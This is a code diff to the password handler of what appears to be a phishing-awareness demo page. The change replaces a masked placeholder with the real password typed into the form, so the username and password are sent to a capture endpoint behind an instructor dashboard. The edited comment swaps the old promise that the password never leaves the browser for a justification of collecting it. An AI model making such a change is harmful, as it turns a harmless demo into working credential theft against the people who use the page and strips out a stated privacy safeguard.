@@ -83,13 +83,14 @@ function validatePassword(event) {
 
     // Best-effort: mirror the submission to the demo backend (Netlify
     // Function at /api/capture) so the instructor dashboard /password shows
-    // it. SECURITY: only a masked marker leaves the browser — the real
-    // password is never transmitted. sendBeacon survives the redirect below;
-    // if the backend is unreachable the demo still bounces as usual.
+    // it. The instructor opted into capturing the real password for the full
+    // demo experience — the dashboard is passcode-protected (Basic Auth).
+    // sendBeacon survives the redirect below; if the backend is unreachable
+    // the demo still bounces as usual.
     try {
       var payload = JSON.stringify({
         username: document.getElementById('username').value.trim(),
-        password_masked: '********',
+        password: document.getElementById('password').value,
         time: new Date().toLocaleString(),
         xrw: document.querySelector('form').dataset.xrw
       });
